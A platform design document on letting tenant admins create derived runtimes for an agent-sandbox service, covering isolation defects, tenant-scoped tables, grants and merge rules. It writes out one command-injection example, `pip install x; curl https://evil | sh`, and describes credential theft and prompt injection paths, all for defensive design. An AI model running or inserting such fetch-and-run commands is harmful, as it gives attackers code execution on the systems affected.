# Tenant-derived runtimes

Status: design for owner review, revision 6, 2026-11-04. Nothing here is built or staged, and no test or spike was run for it. Statements about the tree were checked by reading the code, the chart, the migrations, and the specification. Revisions 2 to 6 apply independent reviews, each under its own "Review of revision" section. A stop check on revision 5 found no Critical, High, or Major issue in this document, and no review has read revision 6. It reads against `egress-and-git-design.md` revision 56, `tenant-scoping-identity-design.md` revision 19, `security-oversight-design.md` revision 18, and `user-credential-delivery-design.md` revision 15. Proposals carry the label DR-n, and defects found here carry the label DF-n. The DF-n defects are filed in `BUILD-GAPS.md`, and the table under "Defects found while verifying" names each F-id.

## Problem

§15.1 **REST API** reserves `POST /v1/admin/runtimes` and `POST /v1/admin/pools` to `platform-admin`. A `tenant-admin` can only update records granted to its tenant. The owner wants a tenant admin able to create derived runtimes.

The immediate need comes from `tenant-scoping-identity-design.md`, "Pods with no per-session policy", and its decision 15. Concurrent and service-mode pods refuse a session whose environment has anything of its own, so an environment that needs such a runtime uses a derived runtime with `sessionPolicy.maxConcurrentSessions: 1`. Today each such environment needs an operator's action, and the route does not work even for an operator (see "Current state").

The capability is general. A tenant admin can also add default workspace files, setup commands, an agent interface, labels, and narrower limits to a runtime the platform has made available.

## Scope

This design covers tenant-created derived runtimes, the pools they need, the grant that turns the capability on, the fields a tenant can set, the base runtime lifecycle, and the interactions with environments, experiments, delegation, and security oversight.

These are out of scope:

- A tenant registering its own image or a standalone runtime.
- Sharing a tenant-derived runtime with another tenant, or deriving from one.
- A route to per-session policy for a service-mode runtime. A derived runtime cannot change `executionMode`, so the rule in `tenant-scoping-identity-design.md` stands for that runtime, and its environment needs a `platform-admin` to register a session-mode runtime of the same image.
- Egress ceilings, overlays, and per-class gates, which `egress-and-git-design.md` owns. Security roles and the tenant security record, which `security-oversight-design.md` owns. Environment scoping, which `tenant-scoping-identity-design.md` owns.

## Requirements

- R1. A `tenant-admin` holding the platform's grant can create, update, and delete a derived runtime of a base the grant names, with no `platform-admin` action per runtime.
- R2. A tenant admin can give an environment one-session pods of a runtime whose shared pool serves concurrent sessions.
- R3. Another tenant cannot see, name, use, collide with, or be affected by a tenant-derived runtime.
- R4. Nothing a tenant sets widens what the base and the platform allow: image, process, isolation, execution mode, egress ceiling, credential delivery, or command policy.
- R5. The platform bounds the pods each tenant's derived runtimes hold, warm and active, and those bounds sum to no more than a deployment total the operator sets. Nodes and the namespace `ResourceQuota` stay shared with every other pool, so R5 limits what owned pools take and reserves nothing for anyone.
- R6. A tenant-derived runtime blocks no platform write, apart from the exceptions DP9 states, and a platform change does not strand a tenant without notice, apart from a stated emergency path.
- R7. A tenant's security team can forbid the capability and can see what it produced.
- R8. A deployment that issues no grant behaves as it does today, apart from the defect fixes in DR-1 to DR-3.

## Security properties

- DP1. A tenant-derived runtime's owner comes from the authenticated principal at create and never changes. No request field sets it.
- DP2. A tenant-derived runtime's row is readable only in a transaction carrying its tenant's context or the platform's all-tenants context. A query with no tenant context cannot see it.
- DP3. Every session path resolves a runtime name within the session's tenant, through an interface that cannot read another tenant's row. A tenant-view miss on the final row refuses the request, on any name, with one answer for an absent name and another tenant's name.
- DP4. A pod of an owned pool serves only the owner, from its creation to its end.
- DP5. The image, process, isolation profile, execution mode, credential delivery mode, and egress ceiling of an owned pool's pods come from platform-written records.
- DP6. A tenant default, file or command, is treated as code execution at the agent UID. It is accepted only on a base whose setup runs at that UID, so neither a tenant command nor a base command reading a tenant file runs with the adapter's identity. A command also passes the base's `setupCommandPolicy`, with `shell: false`.
- DP7. Budgets are platform-held. A tenant has no write path to its own grant.
- DP8. The capability adds no Kubernetes permission to the gateway, and no tenant input reaches a cluster-scoped resource.
- DP9. A platform write to a base or a template pool succeeds regardless of what tenant-derived runtimes exist. The exceptions are `DELETE .../tenant-access/{tenantId}` and a template's `DELETE`, which the operator's own live grant entry refuses, and a base's `DELETE` before its retirement date, which an emergency retirement gets past.
- DP10. Each write passes through EG-9's single write path, applies any SO-2 guardrail, and records the content it changes.
- DP11. An experiment's effects reach a pool only when the experiment's tenant is that pool's single tenant.

## Current state

Each row was checked against the named source.

| Claim | Status | Source |
| :-- | :-- | :-- |
| Runtime and pool records carry no `tenant_id` and no row-level security | True. `runtime_definitions` and `sandbox_warm_pools` key on `name`, and the store runs plain queries with no tenant context. | §4.2 **Multi-tenancy:**, migrations `0001` and `0033`, `runtimestore/pgstore` |
| `tenant-admin` cannot create | True. Create, delete, and tenant-access routes use `requireAdmin`. | `externalapi/admin/routes.go` |
| A `tenant-admin` update on a granted record reaches other tenants | True, for runtimes and pools. See "Shared records today" and DF-1. | `requireResourceManage`, `applyRuntimeUpdate`, `applyPoolUpdateMerge`, F-5.2.67 |
| `runtime_tenant_access` gates runtime use | False. Only the admin routes and one internal metadata route read it. Session create, discovery, and delegation do not. See DF-2. | `tenantReachesRuntime`, `requireEnvironmentAdmission`, `filterRuntimesByEnvironment` |
| A pool on a derived runtime produces pods | False, from reading the code. See DF-3. | `createPod` in `pkg/controller/sandbox/controller.go` |
| A derived runtime with no pool falls back to the base's pool | False. §5.1 states it, and `ResolvePool` matches `tmpl.Spec.RuntimeRef` exactly. See DF-5. | `podsession/resolve.go` |
| A derived runtime's `sessionPolicy` sets its pods' concurrency | False. Concurrency, recycling, and cleanup come from the pool row. Only `maxClientIdleSeconds` is read from the runtime. See DF-6. | `poolPolicyMirror`, `PoolStoreSource.toConfig`, `sessionidle.go`, `envelope.go` |
| A runtime's default setup commands are checked against its policy | False, by specification. They are exempt from `setupCommandPolicy`. | §7.5 **Command policy:**, `enforceSetupCommandPolicy` |
| Setup commands run in the runtime container | False on a sidecar pod. `RunSetup` execs them in the adapter process's container. See DF-4. | `pkg/adapter/staging.go`, `pkg/adapter/workspace/setup.go` |
| Restrict-only merge rules hold | In part. Providers, recursion, and schema property names are checked. `setupCommandPolicy` and `delegationPolicyRef` are not. See DF-7. | `validateDerivedRuntime`, `Merge` |
| A base change that invalidates a derived runtime is refused | True for `supportedProviders`, `allowSelfRecursion`, `runtimeOptionsSchema`, and the setup timeout pairing, with `BASE_RUNTIME_MUTATION_INVALIDATES_DERIVED` and the names of the affected runtimes. | `derivedRuntimesInvalidatedBy` |
| Deleting a runtime checks dependents | False, against §15.1's deletion rule. See DF-8. | `handleDeleteRuntime` |
| An experiment acts only on its own tenant's pools | False. The controller applies experiment effects to any named pool. See DF-9. | `ExperimentVariantSource.ListPoolConfigs`, `ResolveVariantRoles`, `requireTenantResourceAdmin` |
| Pool ownership exists | False. `ownerTenantId` appears only in `egress-and-git-design.md`, which cites a draft 0111 that is absent from `proposals/`. | Search of `pkg/`, `spec/`, `migrations/`, `charts/`, and `proposals/` |
| The gateway can write pool CRDs | False. It holds `get`, `list`, and `watch` on `sandboxwarmpools`, `sandboxtemplates`, and `runtimes`. The PoolScalingController holds `create`, `update`, and `delete` on the first two. | `gateway-deployment.yaml`, `pool-scaling-controller-rbac.yaml` |
| A precedent for moving a registry to tenant scope exists | True. Migration `0054` gave `delegation_policies` a `tenant_id`, `lenny_tenant_guard`, and `lenny_tenant_isolation`. | `migrations/0054_delegation_policies_tenant_scoped.up.sql` |

### Shared records today

A `tenant-admin` updating a granted platform-global record affects every other tenant holding a grant on it.

`PUT /v1/admin/runtimes/{name}` checks only that the caller's tenant holds a grant. `applyRuntimeUpdate` then writes `workspaceDefaults`, `labels`, `setupCommandPolicy`, `delegationPolicyRef`, `publishedMetadata`, `sessionPolicy`, `limits`, `isolationProfile`, `executionMode`, and `capabilities`. `runtimes.go` contains no role check. §14.1 **Runtime workspace defaults.** composes the runtime's `workspaceDefaults` into every session's plan, and §7.5 **Command policy:** exempts those commands from `setupCommandPolicy`. An administrator of tenant `acme` can therefore place a command that runs in a session of tenant `globex`. The RuntimeReconciler rewrites the CRD-owned fields at its next reconcile, and its field list omits `workspaceDefaults`, `publishedMetadata`, `sessionPolicy`, and `sharedAssets`, so those writes persist on a CRD-registered runtime too.

The pool routes have the same gate. F-5.2.67 records the egress case. The same gate also lets one tenant re-point `runtimeRef`, change `isolationProfile`, set the warm count, and drain a shared pool, which refuses new sessions for every tenant on it.

### Not verified

- How a §10.5 upgrade's new image reaches pods was not established. `SandboxTemplateSpec` has `runtimeRef` and no image, and the upgrade store holds `NewImage`. DR-5 therefore leaves open how owned pools follow a base upgrade, and whether each owned pool needs its own upgrade run. An owned pod takes the base's `Runtime` resource at creation under this design.
- DF-3 rests on a search for any path that creates a `Runtime` resource for an admin-registered runtime. The search found none, and no pod was started to confirm it.
- Who creates the Kubernetes Service a service-mode pool routes through was not established. Decision 10 does not depend on it.
- Whether billing reads warm-pod minutes per pool was not read.
- What the projected service account token can do at the gateway was not traced, so DF-4's rating is a floor.
- What `messages.go` does on a not-found answer from its runtime read was not traced. The type change under "Reading" covers it either way.
- The tree was read at commit `a575d5718`, and the design documents as they stand in the working tree.

## Costs of the capability

The owner has decided to have this capability. These are its costs.

- **Tenant code in every session.** Any tenant default is code execution at the agent UID, in every session on that runtime, and the user creating the session has no opt-out. A default file is code as well as a command: a base command installs from it, and a runtime loads a hook or configuration file from the workspace. A stolen `tenant-admin` therefore reaches what `user-credential-delivery-design.md` lists for this attacker: it reads a `file` token and uses an `inject` token, including a host's mint operation. It also reads what later sessions place in the workspace. A grant with `allowWorkspaceFiles` and `allowSetupCommands` off carries none of this cost and still serves R2. DF-1 is worse than this today, because it crosses tenants, and DR-1 closes it. Within a tenant the risk is new.
- **Warm pods per runtime.** Each tenant-derived runtime has its own pool and at least one warm pod, because a pool has no working cold path today (DF-11). An environment moved from a concurrent pod to one-session pods also uses more pods per session.
- **Capacity planned by customers.** §17.8.2's sizing assumes an operator's pool list. Tenant writes now add pools within the budgets, and the namespace `ResourceQuota` is shared.
- **Slower base retirement.** A base with tenant-derived runtimes takes a notice period to retire, apart from the emergency path, and a platform change reaches runtimes the operator did not write.
- **A wider read path.** Every session-path read of a runtime changes to take a tenant, across `pkg/gateway/sessionserver`, `pkg/gateway/mcpfabric`, `pkg/gateway/session`, and `cmd/lenny-gateway`, and each holder of the plain store changes type. The compiler finds those sites. Many of them continue on a not-found answer today, so the change is needed for correctness as well as isolation (see "Reading").
- **Operating load.** Tenant-chosen runtime and pool names appear in operator logs and in metric labels, which raises label cardinality, and an operator debugging a failed pod now reads tenant configuration.
- **Prerequisite work.** DR-1, DR-2, and DR-3 close defects this capability cannot rest on. DF-3 and DF-5 mean no derived runtime runs a session today, so decision 15's route needs DR-2 whoever creates the runtime.

## DR-1 to DR-3: Prerequisites

**DR-1, the shared-record boundary.** R3 and R4 need a base that no tenant can change. A `tenant-admin` loses every write on a platform-global runtime or pool, including the pool's `warm-count`, `drain`, `circuit-breaker`, `bootstrap-override`, and `resume-reconciliation` routes. `PermManageRuntimes` and `PermManagePools` leave `RolePermissions(RoleTenantAdmin)`, which is what `TenantAdminPermissions()` returns and what the custom-role ceiling reads, so a custom role cannot hold them either. `AllPermissions()` keeps them for `platform-admin`. Reads stay. EG-9's tenant pool overlay remains the path for egress and git settings, and a derived runtime is the path for the rest. DR-1 also moves session create, discovery, and delegation to read `runtime_tenant_access`, and reserves the `--` name form. On an unpinned resolution, a pool with a store row and no owner needs a `pool_tenant_access` row, an owned pool checks its owner, and a CRD-only pool such as `echo-pool-embedded` is exempt, because the foreign key on `pool_tenant_access` refuses it. A soft-deleted row counts as a store row, and a read error refuses. A miss answers as no matching pool. The check runs only where a create, derive, replay, or child placement claims a pod, so a revocation does not fail `/start` for a session already holding a claim or lose slot accounting in `startOnPod`, `launchOnPod`, `resumeOnPod`, and `accountFailedSlot`.

Those reads refuse every session on a fresh install unless the seed grants access, and it does not (DF-14). DR-1 therefore implements §17.6's `tenantAccess` on seeded runtimes and pools. An absent `tenantAccess` grants `default` when the seed names no tenant, the seed's tenant when it names exactly one, and none when it names several (decision 15). The `lenny-bootstrap` Job also runs post-upgrade, so a list or default applies only when the seed creates the row, as §17.6's "left unchanged" states, which keeps `helm upgrade` from undoing a revocation. `--force-update` reapplies a listed `tenantAccess` and never the default.

DR-1 also closes the experiment path (DF-9), under one rule: a pool's single tenant is its owner, or else the only tenant with a `pool_tenant_access` row.

- A `tenant-admin` writing an experiment can name as `variant.Pool` only a pool its tenant owns, and as `variant.Runtime` only a runtime its tenant can reach, on `POST` and `PUT`. Any other name answers as unknown. Until DR-5 lands no pool qualifies, so such an experiment sets `variant.Runtime` alone.
- `handlePatchExperiment` takes status alone, so a status change on a stored experiment naming a non-owned pool requires `platform-admin`, and so does a `PUT`, which could otherwise drop the pool first. A `tenant-admin` cannot pause or conclude what a `platform-admin` set up on a platform pool.
- A `platform-admin` can name a platform pool whose single tenant is the experiment's tenant.
- `ExperimentVariantSource` applies `PoolVariant`, `InitialMinWarm`, `ForceZeroMinWarm`, and `DrainAndDelete` only to a pool whose single tenant is the experiment's tenant, and it applies the base-pool reduction under the same test. A base pool shared with another tenant is skipped, as `PoolStoreBasePoolResolver` already skips an ambiguous pool, so it stays somewhat over-warmed. Adding a second grant ends the effects on that pool.
- `ResolveVariantRoles` runs per tenant, so a malformed set drops that tenant's variants alone.

**DR-2, pods for derived runtimes.** `podRuntimeRef` is under "Pods". §5.1 changes to state that a derived runtime needs its own pool, removes the fallback sentence, and states that `sessionPolicy` on a derived runtime supplies the values of its pool. A platform-created derived runtime follows the same rule, so this fixes decision 15's route for an operator on its own.

**DR-3, setup command identity.** On a sidecar pod the adapter asks the runtime supervisor over `CH-SUPERVISE` to run each setup command in a forked worker at the agent UID, as §4.7.10 **Runtime supervisor.** **Cleanup.** states for `cleanupCommands`. Commands then run from the runtime image, with the agent's access. A client's commands get the same change. A pod with no supervisor keeps today's behaviour for operator-written and client commands, and a tenant default is refused on such a base. DR-3's claim is limited to the adapter's identity: the token and the writable volume go out of reach. On a concurrent pod the agent UID can still read every slot's credential file, which §13.1 **Per-slot credential-read scope** states, so DR-3 does not close that read.

## DR-4: Tenant runtime records

### Options

| Option | Result |
| :-- | :-- |
| A nullable `owner_tenant_id` on `runtime_definitions` | Existing reads keep working unchanged, and each one would return another tenant's row unless it adds a check. DF-2 shows how application-layer filtering on this record has fared. It also fails `lenny_tenant_guard` and §12.3's R-01. |
| A composite key `(tenant_id, name)` on one table | It rewrites the table, its foreign keys, and the platform rows, and it leaves two tenants with one name, which conflicts with the pod label, the CRD names, and pool lookup by name. |
| **A separate tenant-scoped table, with a reserved name prefix per tenant (recommended)** | A query with no tenant context cannot see a tenant row, so a missed read leaks nothing. "Reading" states why that alone is not enough. Every name stays globally unique, so session rows, pod labels, CRDs, and metrics keep one string. |

### Stored format

`tenant_runtime_definitions` holds the columns of `runtime_definitions` plus `tenant_id`, with `(tenant_id, name)` as primary key and a unique index on `name`. It takes `lenny_tenant_guard` and `lenny_tenant_isolation`, as migration `0054` did for delegation policies, so §4.2's statement that a missing WHERE clause cannot break isolation holds. Reads go through `pgtenant.InTx` with the tenant, and platform reads go through `pgtenant.InAllTenants`. §4.2's classification table gains a tenant-scoped row, and the platform-global row stays for platform records. §12.8 erasure gains this table, the grant, and owned pools. See "Tenant suspension and deletion".

### Names

The platform assigns each granted tenant a `namePrefix`, unique across tenants and immutable once the tenant has a row. A tenant-derived runtime is named `<namePrefix>--<suffix>`, such as `acme--chat-payments`.

- A prefix matches `^[a-z0-9]+(-[a-z0-9]+)*$`, so it holds no `--` and does not end in `-`. A name therefore has one prefix, read up to its first `--`. Without this, `a--b--x` fits the prefixes `a` and `a--b`.
- `consumed_name_prefixes` records each prefix when first assigned, and neither withdrawal nor erasure removes it, so a later tenant cannot take a name that retained records still carry.
- `--` becomes reserved. The admin API, the bootstrap seed, and the RuntimeReconciler refuse a platform runtime or pool name containing it. Nothing is deployed, so nothing migrates.
- A tenant's write naming another prefix is refused with `422 INVALID_DERIVED_RUNTIME`, so `RESOURCE_ALREADY_EXISTS` can only report the tenant's own name and is no oracle.
- The whole name is at most 63 characters, because `createPod` copies it to the `lenny.dev/runtime` pod label (DF-10).
- A deleted name stays consumed, as `egress-and-git-design.md` states for pools, and only the tenant's own names are consumed. Creates are rate-limited, and soft-deleted rows count toward a separate bound.

### Reading

`runtimestore` gains a tenant view, `Resolve(ctx, tenantID, name)` and `List(ctx, tenantID)`. A name containing `--` reads only the tenant table, in that tenant's context. Any other name reads the platform table and requires a `runtime_tenant_access` row. `List` returns granted platform rows plus the tenant's own rows. It also evaluates the grant entry on each resolve (see "Base changes"). This is also what closes DF-2.

Row-level security stops a leak and does not stop a wrong answer. A tenant-derived name read through the platform store returns `ErrNotFound`, and many sites continue on that answer: `runtimeSetupPolicy` in `bind_request.go` keeps `shell` true, which loses `setupCommandPolicy.shell: false`; `enforceSetupCommandPolicy` and §14.1 **Runtime workspace defaults.** rule 4 bind the plan unchecked with no defaults; `requireExplicitEnvironmentAdmission` leaves the name to later checks; and the limits, idle, content-policy, and manifest reads in `envelope.go`, `sessionage`, `sessionidle`, `delegation/service.go`, and `mcptools_register.go` fall back to defaults. These rules follow.

- `Server`, `mcptools.Deps`, the delegation service, the session resolvers, and `credentialsurface.go` in `cmd/lenny-gateway` hold the tenant-view interface and no plain `Store`, so a missed site does not compile. `runtimecapoverride.ResolveForTenant` takes the view as well.
- `Store.Get` on a name containing `--` returns `ErrTenantScopedName`, distinct from `ErrNotFound`, and no path continues on it.
- A tenant-view miss on the final row refuses the request, on any name, at create, derive, replay, and a delegated child's placement, after any experiment or `PreRoute` rewrite. `ResolvePool` reads no runtime store, so without this a revoked grant still lands sessions. The answer is `RESOURCE_NOT_FOUND`, or the surface's own not-found answer, for an absent name and for another tenant's name. §14.1 rule 4 does not apply where the tenant view is wired. On a create this check runs first, because `requireAdmissionRateLimit` calls `ResolvePool` before any runtime read.

`GET /v1/runtimes/{name}/meta/{key}` has no principal, so a `--` name always answers not found there.

`Router` holds the tenant view too, and its plain `Store` moves to a field that only `requireAdmin` routes use. A handler only `platform-admin` reaches reads a view seeing both tables, through `pgtenant.InAllTenants`, wherever it reads a pool's runtime. Without that, `validatePoolUpdate` answers `400` for an owned pool on every `PUT` and on `warm-count`, which delegates to it, and `poolIsSDKWarm` and `runtimeRestartable` read false.

A handler a `tenant-admin` reaches reads the tenant view for one tenant and never the all-tenants view. These are `delegationPolicyRuntimeDependents`, `handleEnvironmentRuntimeExposure`, `environmentDryRunPreview`, `validatePoolProxyDialect`, `checkVariantIsolation`, and the capability override `PUT`, which otherwise answers `404` for the tenant's own derived runtime. Two of them need more than a type change:

- The policy guard takes the policy's tenant. Migration `0054` keys policies on `(tenant_id, name)`, so names collide across tenants. Read across tenants, a `globex` admin deleting `strict` would get `409` naming `acme--chat-payments`, and `acme` would block that delete (DF-13).
- `checkVariantIsolation` returns nil on any read error, so a `--` base would skip the admission check. A miss on the tenant view refuses the write.

### API

| Route | Caller | Behaviour |
| :-- | :-- | :-- |
| `PUT /v1/admin/tenants/{id}/derivation-grant` | `platform-admin` | Creates or replaces the grant. Mirrored to the tenant's chain under SO-4a. |
| `GET /v1/admin/tenants/{id}/derivation-grant` | `platform-admin`, and `tenant-admin` for its own | Returns the grant and current use. |
| `POST /v1/admin/derived-runtimes` | `manage_derived_runtimes` | Creates the runtime and its owned pool in one transaction. |
| `GET /v1/admin/derived-runtimes[/{name}]` | The same permission, `tenant-viewer`, and `platform-admin` with `?tenant_id=` | Returns the declared fields, the effective runtime, `ownerTenantId`, `baseStatus`, and `poolStatus`. |
| `PUT /v1/admin/derived-runtimes/{name}` | `manage_derived_runtimes` | Requires `If-Match`, and takes the same body. `name` and `baseRuntime` are immutable. |
| `POST /v1/admin/derived-runtimes/{name}/drain` | `manage_derived_runtimes` | Drains the owned pool, so its new sessions stop. |
| `DELETE /v1/admin/derived-runtimes/{name}` | `manage_derived_runtimes` | Checks dependents first. It answers `409 RESOURCE_HAS_DEPENDENTS` and changes nothing while non-terminal sessions remain, as §15.1's deletion rule states, and otherwise removes the runtime and pool. |

New routes keep `requireAdmin` on `POST /v1/admin/runtimes` untouched and give the request its own schema. The body decodes with unknown fields refused, because the existing handlers silently drop them, and a refused field must not read as accepted. `runtimeRef` and `AuthorizedRuntime` do not change on the wire. `manage_derived_runtimes` is a new named permission that `tenant-admin` holds, and a custom role can hold it under §10.2's ceiling. An environment `admin` does not hold it, in line with `tenant-scoping-identity-design.md` decision 7.

New error codes are `403 DERIVATION_NOT_GRANTED`, `422 DERIVATION_BUDGET_EXCEEDED`, and `409 DERIVED_RUNTIME_UNAVAILABLE`, whose `details.reason` names the base state below. Field refusals reuse `INVALID_DERIVED_RUNTIME` with `details.field`. Writes use EG-9's write path, which applies `GUARDRAIL_VIOLATION`.

### Stored formats and wire contracts this forces

| Item | Change | Proposal |
| :-- | :-- | :-- |
| `tenant_runtime_definitions` | New table, with EG-9's nullable `suspended_by` | DR-4 |
| `tenant_derivation_grants` | New table, with one row per tenant, readable under the tenant's context, and written only under `lenny.admin_mode`, using the trigger migration `0052` introduced | DR-4 |
| `consumed_name_prefixes` | New table, holding the prefix string alone, written at first assignment, and surviving withdrawal and erasure | DR-4 |
| `runtime_definitions` | `retire_at`, and `deployment_model` and `registered`, which the RuntimeReconciler mirrors | DR-4, DR-6 |
| `sandbox_warm_pools` | `owner_tenant_id` from EG-9, plus `template_pool`, `pod_runtime_ref`, and `warm_stop_reasons` | DR-2, DR-5 |
| `SandboxTemplate.spec` | `podRuntimeRef` and the owner, because the controller stamps the owner from it | DR-2, DR-5 |
| Base-change outbox | A row written in the platform write's transaction | DR-6 |
| Pod label | `lenny.dev/served`, under `lenny-label-immutability` | DR-5 |
| Name grammar | `--` reserved | DR-1 |
| §15.1 | The routes and codes above | DR-4, DR-6 |

## Who turns it on

The capability needs a grant per tenant, in the form of EG-9's per-class gates, with parameters. The class is `tenantDerivedRuntimes`, and a tenant with no grant answers `403 DERIVATION_NOT_GRANTED`. A Helm value, `runtimes.tenantDerivation.enabled`, is false by default. While false it refuses a new grant, any write that raises a limit or adds a base, flag, or overlay, and `POST /v1/admin/derived-runtimes`. A withdrawal or a narrowing still passes, and existing runtimes keep resolving, so turning it off stops new use and is not an emergency stop.

```yaml
# PUT /v1/admin/tenants/{id}/derivation-grant
namePrefix: acme
maxRuntimes: 10
maxOwnedPods: 20
bases:
  - baseRuntime: chat
    templatePool: chat-shared
    resourceClasses: [small, medium]
    allowWorkspaceFiles: false
    allowSetupCommands: false
    ownedOverlays: []
```

A base entry is accepted only when all of these hold:

- The base is a standalone runtime with `executionMode: session`.
- The tenant holds `runtime_tenant_access` on it.
- `templatePool` is a platform pool backed by the base, and the tenant holds `pool_tenant_access` on it.
- `resourceClasses` lies within the base's `allowedResourceClasses`.
- The base has `requireSoPeercred` true, because `acknowledgeNonceOnlyAuth` is a deployer's statement that a tenant does not make.
- The base's `Runtime` resource exists, which the gateway's `get` permission reads, because a pool's pods need it (DF-3).
- With `allowWorkspaceFiles` or `allowSetupCommands` set, the base is `type: agent` with `deploymentModel` `sidecar` or empty, which `runsSupervisor` reads as sidecar, so it runs the runtime supervisor.
- With `allowSetupCommands` set, the base's `setupCommandPolicy` has mode `allowlist` and `shell: false`.

A base outside the list cannot be derived from, and "Base changes" states what each grant change does. A grant or a withdrawal is a platform admin's write to a customer's configuration, so SO-4a mirrors it, as for the other gates.

## Fields

Each row follows §5.1 **Normative Merge Algorithm**. Rows marked "not in §5.1" appear in `Merge` or the payload and are absent from the table (DF-12). "Narrow" means the value is checked against the base at write and evaluated against the live base at resolve, as "Base changes" states.

| Field | Merge rule | Tenant | Rule and reason |
| :-- | :-- | :-- | :-- |
| `name`, `baseRuntime` | Own, reference | At create | Under "Names" and the grant. Single-level, as `validateDerivedRuntime` requires. |
| `image`, `type`, `executionMode`, `isolationProfile`, `allowedResourceClasses`, `capabilities.*`, `integrationLevel`, `requireSoPeercred`, `command`, `env` | Prohibited or inherited | Refused | They describe the image and its security posture. |
| `workspaceTier`, `sdkWarmBlockingPaths`, `archivePolicy`, `minPlatformVersion` | Not in §5.1 | Refused | `Merge` takes the first two from the base. `archivePolicy` opts in to symbolic links. The last has no use for a tenant. |
| `description` | Not in §5.1 | Yes | It reaches only the owner. |
| `supportedProviders` | Override, restrict | Narrow | A subset of the base's. |
| `credentialCapabilities` | Override | Narrow | `proxyDialect` is a subset, and `hotRotation` stays false when the base's is false, because each describes the binary. |
| `limits` | Override | Narrow per field | A larger `maxSessionAge` or `maxUploadSize` holds platform capacity past the value the platform set. |
| `setupCommandPolicy` | Override, restrict | Narrow | An allowlist is a subset. `blocklist` to `allowlist` is accepted and the reverse is refused. `shell: true` over `false` is refused. `maxCommands` is at most the base's. Effective policy applies both, closing DF-7. |
| `setupPolicy.timeoutSeconds` | Maximum | Yes, positive | It is bounded by `gateway.maxFinalizingTimeoutSeconds`, as `validateSetupPolicy` does. A longer setup holds only the tenant's pod. Zero means no cap and is refused. |
| `setupPolicy.onTimeout` | Override | Yes | It affects only the owner's sessions. |
| `workspaceDefaults.files` | Append | Under `allowWorkspaceFiles`, after DR-3 | See "Tenant defaults". Replacing a base file's path is refused. Each is a §14 `inlineFile` under a Helm size bound, visible in `GET /v1/sessions/{id}`, so it holds no secrets. |
| `workspaceDefaults.setupCommands` | Append | Under `allowSetupCommands`, after DR-3 | See "Tenant defaults". |
| `runtimeOptionsSchema` | Override, subset of names | Yes | A client's options are validated against the derived and base schemas together, because a name check alone lets a derived schema drop a base's `maximum`. A tenant schema is also new input to `validateAgainstSchema`, which compiles it per session with the default `Loaders` of `jsonschema/v5`, including `file`, and reads a compile failure as no constraint. The write therefore compiles it, refuses `$schema`, `$id`, and any `$ref` other than a local fragment, and bounds its size. |
| `defaultPoolConfig` | Override | Refused | The `pool` block replaces it. |
| `delegationPolicyRef` | Override, restrict | Yes | It names a policy in the tenant. Effective policy is the intersection §8.3 **Effective policy** states, which needs `Merge` to keep both references (DF-7). A base's reference resolves in the session's tenant today, so a `tenant-admin`, who writes those policies, already controls its content. |
| `allowSelfRecursion` | Restrict-only | `false` only | Unchanged from §5.1. |
| `agentInterface` | Override | Yes | The card the gateway generates carries `VisibilityPublic` today. On a tenant-derived runtime it carries `tenant`. Other agents in the tenant read this text through discovery, so it is a prompt injection channel inside the tenant. |
| `publishedMetadata` | Append | `tenant` visibility only | `public` is served unauthenticated on the operator's origin with a writer-chosen content type. `internal` reaches any authenticated caller in any tenant (§5.1 **`publishedMetadata` Field**). |
| `sessionPolicy` | Override | See below | Applied to the owned pool. |
| `capabilityInferenceMode`, `toolCapabilityOverrides` | Override, the second not in §5.1 | Yes | They affect the tenant's own environment filters, and a tenant already writes `tenantRbacConfig.mcpAnnotationMapping`. |
| `labels` | Merge | Yes | Keys under `lenny.dev/` are refused. See "Environments". |
| `sharedAssets` | Append | Refused | These populate at warm time before any session, the controller reads them only from the `Runtime` resource, and they are not needed for R2. Adding them later is additive. |

### `sessionPolicy`

Every acknowledgment is a deployer's statement, so a tenant writes none. Each value below is checked against the template pool, whose row is what the gateway enforces, and is written to the owned pool.

| Field | Tenant | Rule |
| :-- | :-- | :-- |
| `maxConcurrentSessions` | Lower only | From 1 up to the template's value. Raising is refused. Concurrent slots share a process, `/tmp`, memory, and network (§5.2), the template's `acknowledgeProcessLevelIsolation` was made for the template's value, a runtime is not known to tolerate more, and a raised value moves more users onto E = ∅ pods. |
| `acknowledgeProcessLevelIsolation`, `recycle.acknowledgeBestEffortScrub`, `recycle.acknowledgeMicrovmResidualState` | Refused | Copied from the template. A lowered value that no longer needs an acknowledgment carries none. |
| `recycle.enabled` | `false` always, `true` only when the template recycles | Turning recycling off narrows. Turning it on would need an acknowledgment the platform has not made. Reuse holds only within the reserved hold, because `warmCount` sets `minWarm` and `maxWarm` equal, which makes §5.2's pinned idle bound zero. |
| `recycle.allowCrossTenantReuse` | Refused | An owned pool has one tenant. |
| `recycle.runtimeProcess` | `restart` when the runtime is `restartable`, `keep` only when the template is `keep` | A kept process carries memory between sessions. |
| `recycle.maxSessionsPerPod`, `maxPodUptimeSeconds`, `maxScrubFailures` | Lower only | Each bounds residual state. |
| `recycle.onScrubFailure`, `recycle.scrubProfile` | `fail` over `warn`, and the template's profile | |
| `cleanupCommands`, `cleanupTimeoutSeconds` | Refused | §5.2 **Lenny scrub procedure** runs them in the adapter's container on a pod with no runtime supervisor. Adding them later is additive. |
| `maxSessionAgeSeconds`, `maxClientIdleSeconds`, `slotRetries` | Lower only | They bound how long the tenant holds capacity. |
| `onPoolExhausted`, `maxQueueWaitSeconds` | `reject`, or `queue` within the template's wait | The queue is gateway memory. |

### Tenant defaults

Any tenant default is code execution at the agent UID. A file reaches an exempt base command: with a base command `pip install -r requirements.txt`, a tenant-written `requirements.txt` selects what gets installed, whatever `allowSetupCommands` says. A runtime also loads hook and configuration files from the workspace. No command control bounds a file, so a file has its own grant flag.

Both kinds need their grant flag, a base that runs the runtime supervisor, and DR-3 landed. Without DR-3 the base's command runs at the adapter's UID in the adapter's container, which holds the projected service account token and a writable credential volume (DF-4). On an embedded base a tenant file would be read by a runtime that shares the adapter's identity, and a `type: mcp` base runs no supervisor. Neither flag is needed for R2.

Today's command exemption exists because an operator wrote `workspaceDefaults`. A tenant-written command gets no exemption. It counts toward `maxCommands` and is checked against the effective `setupCommandPolicy` at write and again when the plan binds, so a narrowed base policy takes effect. The effective policy must be `allowlist` with `shell: false`, because matching is a prefix on raw text: under a shell, `pip install x; curl https://evil | sh` matches `pip install`. A `blocklist` is not a security boundary, as §7.5 states, and a base with no policy checks nothing. Under `shell: false` an allowlist bounds the program and its arguments, and an allowed program can still run what it fetches. Base commands run first and cannot be removed, as the merge rule states.

### Compared with a session plan

| A client's plan today | A tenant-derived runtime | Difference |
| :-- | :-- | :-- |
